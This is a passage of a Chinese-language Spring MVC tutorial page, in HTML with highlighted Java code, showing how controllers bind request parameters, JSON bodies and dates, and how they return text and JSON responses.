namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>domain<span class="token punctuation">.</span></span><span class="token class-name">User</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span></span><span class="token class-name">Controller</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestMapping</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestParam</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">ResponseBody</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Array</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Arrays</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@Controller</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UserController</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/commonParam"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ResponseBody</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">commonParam</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span><span class="token keyword">int</span> age<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"普通参数传递 name==>"</span><span class="token operator">+</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"普通参数传递 age==>"</span><span class="token operator">+</span>age<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">"&#123;'module':'common param'&#125;"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@ResponseBody</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/commonParamDifferentName"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">commonParamDifferentName</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span> <span class="token class-name">String</span> username<span class="token punctuation">,</span> <span class="token keyword">int</span> age<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"普通参数传递 userName==>"</span> <span class="token operator">+</span> username<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"普通参数传递 age==>"</span> <span class="token operator">+</span> age<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">"&#123;'module':'common Param Different Name'&#125;"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@ResponseBody</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/pojoPram"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">pojoPram</span><span class="token punctuation">(</span><span class="token class-name">User</span> user<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"pojo参数传递 user==>"</span> <span class="token operator">+</span> user<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">"&#123;'module':'pojoPram'&#125;"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@ResponseBody</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/pojoContainPojoPram"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">pojoContainPojoPram</span><span class="token punctuation">(</span><span class="token class-name">User</span> user<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"pojo嵌套pojo参数传递 user==>"</span> <span class="token operator">+</span> user<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">"&#123;'module':'pojoContainPojoPram'&#125;"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@ResponseBody</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/arrayParam"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">arrayParam</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> likes<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"数组参数传递 likes==>"</span> <span class="token operator">+</span> <span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>likes<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span>  <span class="token string">"&#123;'module':'arrayParam'&#125;"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@ResponseBody</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/listParam"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">listParam</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> likes<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"集合参数传递 likes==>"</span> <span class="token operator">+</span> likes<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span>  <span class="token string">"&#123;'module':'listParam'&#125;"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="9-json数据传递参数"><a class="markdownIt-Anchor" href="#9-json数据传递参数">#</a> 9、JSON 数据传递参数</h1><ol><li>添加 json 数据转换相关坐标</li></ol><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>com.fasterxml.jackson.core<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>jackson-databind<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>2.9.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li>设置发送 json 数据（请求 body 中添加 json 数据）</li></ol><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20221004204438275.png" alt="image-20221004204438275"></p><ol start="3"><li>开启自动转换 JSON 数据的支持</li></ol><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Configuration</span><span class="token annotation punctuation">@ComponentScan</span><span class="token punctuation">(</span><span class="token string">"com.itheima.controller"</span><span class="token punctuation">)</span><span class="token annotation punctuation">@EnableWebMvc</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpringMvcConfig</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="4"><li>设置注解 ==@RequestBody== 接收 JSON 数据</li></ol><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Controller</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UserController</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/listParamForJson"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ResponseBody</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">listParamForJson</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestBody</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> likes<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"list common(json)参数传递 list==>"</span><span class="token operator">+</span> likes<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">"&#123;'module':'listParamForJson'&#125;"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>名称：@RequestBody</p><ul><li><p>类型：配置类注解</p></li><li><p>位置：SpringMVC 配置类定义上方</p></li><li><p>作用：开启 SpringMVC 多项辅助功能</p></li><li><p>范例：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Configuration</span><span class="token annotation punctuation">@ComponentScan</span><span class="token punctuation">(</span><span class="token string">"com.itheima.controller"</span><span class="token punctuation">)</span><span class="token annotation punctuation">@EnableWebMvc</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpringMvcConfig</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li><li><p>名称：@RequestBody</p><ul><li><p>类型：形参注解</p></li><li><p>位置：SpringMVC 控制器方法形参定义前面</p></li><li><p>作用：将请求中请求体所包含的数据传递给请求参数，此注解一个处理器方法只能使用一次</p></li><li><p>范例：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@ResponseBody</span><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/listPojoParamForJson"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">listPojoParamForJson</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestBody</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">User</span><span class="token punctuation">></span></span> list<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"list pojo(json)参数传递 list==>"</span><span class="token operator">+</span> list<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token string">"&#123;'module':'listPojoParamForJson'&#125;"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li></ul><h2 id="91-pojo参数"><a class="markdownIt-Anchor" href="#91-pojo参数">#</a> 9.1 POJO 参数</h2><ul><li>POJO 参数：JSON 数据与形对象属性名相同，定义 POJO 类型即可接收参数</li></ul><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20221004204858539.png" alt="image-20221004204858539"></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@ResponseBody</span><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/pojoParamForJson"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">pojoParamForJson</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestBody</span> <span class="token class-name">User</span> user<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"pojo(json)参数传递 list==>"</span><span class="token operator">+</span> user<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token string">"&#123;'module':'pojoParamForJson'&#125;"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="92-pojo集合参数"><a class="markdownIt-Anchor" href="#92-pojo集合参数">#</a> 9.2 POJO 集合参数</h2><ul><li>POJO 集合参数：JSON 数组数据与集合泛型属性名相同，定义 List 类型形参即可接收参数</li></ul><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20221004205012209.png" alt="image-20221004205012209"></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@ResponseBody</span><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/listPojoParamForJson"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">listPojoParamForJson</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestBody</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">User</span><span class="token punctuation">></span></span> list<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"list pojo(json)参数传递 list==>"</span><span class="token operator">+</span> list<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token string">"&#123;'module':'listPojoParamForJson'&#125;"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="93-json数组参数"><a class="markdownIt-Anchor" href="#93-json数组参数">#</a> 9.3 JSON 数组参数</h2><ul><li>JSON 数组参数：</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Controller</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UserController</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/listParamForJson"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ResponseBody</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">listParamForJson</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestBody</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> likes<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"list common(json)参数传递 list==>"</span><span class="token operator">+</span> likes<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">"&#123;'module':'listParamForJson'&#125;"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="94-requestbody与requestparam区别"><a class="markdownIt-Anchor" href="#94-requestbody与requestparam区别">#</a> 9.4 @RequestBody 与 @RequestParam 区别</h2><ul><li>区别：<ul><li>@RequestParam 用于接收 url 地址传参，表单传参【application/×-www-form-urlencoded】</li><li>@RequestBody 用于接收 json 数据【application/json】</li></ul></li><li>应用：<ul><li>后期开发中，发送 json 格式数据为主，@RequestBody 应用较广</li><li>如果发送非 json 格式数据，选用 @RequestParam 接收请求参数</li></ul></li></ul><h1 id="10-日期类型参数传递"><a class="markdownIt-Anchor" href="#10-日期类型参数传递">#</a> 10、日期类型参数传递</h1><ul><li><p>日期类型数据基于系统不同格式也不同</p><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20221005184350039.png" alt="image-20221005184350039"></p></li><li><p>接收 形参时，根据不同的日期格式设置不同的接收方式</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@ResponseBody</span><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/date"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getDate</span><span class="token punctuation">(</span><span class="token class-name">Date</span> date<span class="token punctuation">,</span>                      <span class="token annotation punctuation">@DateTimeFormat</span><span class="token punctuation">(</span>pattern <span class="token operator">=</span> <span class="token string">"yyyy-MM-dd"</span><span class="token punctuation">)</span><span class="token class-name">Date</span> date1<span class="token punctuation">,</span>                      <span class="token annotation punctuation">@DateTimeFormat</span><span class="token punctuation">(</span>pattern <span class="token operator">=</span> <span class="token string">"yyyy-MM-dd HH:mm:ss"</span><span class="token punctuation">)</span><span class="token class-name">Date</span> date2                     <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"参数传递 date==>"</span> <span class="token operator">+</span> date<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"参数传递 date1 yyyy-NN-dd==>"</span> <span class="token operator">+</span> date1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"参数传递 date2 yyyy-NN-dd HH:mm:ss==>"</span> <span class="token operator">+</span> date2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token string">"&#123;'module':'date param'&#125;"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;localhost&#x2F;date?date&#x3D;2055&#x2F;05&#x2F;21&amp;date1&#x3D;2022-04-21&amp;date2&#x3D;2022-01-21 13:23:22<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>注解：<ul><li>名称：@DateTimeFormat</li><li>类型：形参注解</li><li>位置：SpringMVC 控制器方法形参里面</li><li>作用：设定日期时间型数据格式</li><li>属性：pattern：日期时间格式字符串</li></ul></li></ul></li><li><p>Converter 接口</p><ul><li><p>类型转换器</p><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20221005185344568.png" alt="image-20221005185344568"></p></li></ul></li></ul><h1 id="11-响应"><a class="markdownIt-Anchor" href="#11-响应">#</a> 11、响应</h1><h2 id="111-响应页面跳转页面了解"><a class="markdownIt-Anchor" href="#111-响应页面跳转页面了解">#</a> 11.1 响应页面 / 跳转页面（了解）</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//响应页面/跳转页面</span><span class="token comment">//只适用@RequestMapping注解</span><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/toJumpPage"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toJumpPage</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"跳转页面"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token string">"page.jsp"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="112-响应文本数据了解"><a class="markdownIt-Anchor" href="#112-响应文本数据了解">#</a> 11.2 响应文本数据（了解）</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//响应文本数据</span><span class="token annotation punctuation">@ResponseBody</span><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/toText"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toText</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"返回纯文本数据"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token string">"response text"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="113-响应json数据对象转json"><a class="markdownIt-Anchor" href="#113-响应json数据对象转json">#</a> 11.3 响应 JSON 数据（对象转 JSON）</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//响应POJO对象</span><span class="token comment">//return后可自动转，需要在pom里导入Jackson坐标</span><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/toJsonPojo"</span><span class="token punctuation">)</span><span class="token annotation punctuation">@ResponseBody</span><span class="token keyword">public</span> <span class="token class-name">User</span> <span class="token function">toJsonPojo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"返回json对象数据"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">User</span> user <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    user<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">"itcast"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    user<span class="token punctuation">.</span><span class="token function">setAge</span><span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> user<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>com.fasterxml.jackson.core<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>jackson-databind<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>2.9.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="114-响应json数据对象集合转json"><a class="markdownIt-Anchor" href="#114-响应json数据对象集合转json">#</a> 11.4 响应 JSON 数据（对象集合转 JSON）</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//响应POJO集合对象</span><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/toJsonList"</span><span class="token punctuation">)</span><span class="token annotation punctuation">@ResponseBody</span><span class="token keyword">public</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">User</span><span class="token punctuation">></span></span> <span class="token function">toJsonList</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"返回JSON集合数据"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">User</span> user1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">User</span> user2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">User</span> user3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    user1<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">"传智播客"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    user1<span class="token punctuation">.</span><span class="token function">setAge</span><span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    user2<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">"黑马"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    user2<span class="token punctuation">.</span><span class="token function">setAge</span><span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    user3<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">"林青霞"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    user3<span class="token punctuation">.</span><span class="token function">setAge</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">User</span><span class="token punctuation">></span></span> userList <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    userList<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>user1<span class="token punctuation">)</span><span class="token punctuation">;</span>    userList<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>user2<span class="token punctuation">)</span><span class="token punctuation">;</span>    userList<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>user3<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> userList<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" 